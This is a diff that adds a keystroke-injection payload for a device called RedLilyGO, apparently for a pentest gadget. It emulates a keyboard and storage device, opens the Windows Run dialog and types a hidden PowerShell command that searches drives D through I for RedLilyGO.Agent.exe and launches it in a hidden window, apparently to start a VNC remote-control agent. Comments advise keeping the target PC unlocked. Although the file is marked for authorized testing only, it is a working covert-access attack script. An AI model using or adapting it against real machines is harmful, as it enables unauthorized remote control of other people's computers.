@@ -1,0 +1,11 @@
+REM RedLilyGO - Agent VNC auto-start. Requires RedLilyGO.Agent.exe in the SD root. Authorized testing only.
+REM Keep the target PC unlocked and focused while this runs: Win+R needs the desktop.
+REM Keep the typed Run command short (Windows Run truncates near 260 chars). This
+REM checks fixed drive letters instead of Get-Volume, which can stall while the
+REM SD re-enumerates as a USB drive.
+ATTACKMODE HID STORAGE
+DELAY 8000
+GUI r
+DELAY 1500
+STRING powershell -w hidden -c "'D','E','F','G','H','I'|ForEach-Object{$p=$_+':\RedLilyGO.Agent.exe';if(Test-Path $p){Start-Process $p -WindowStyle Hidden}}"
+ENTER
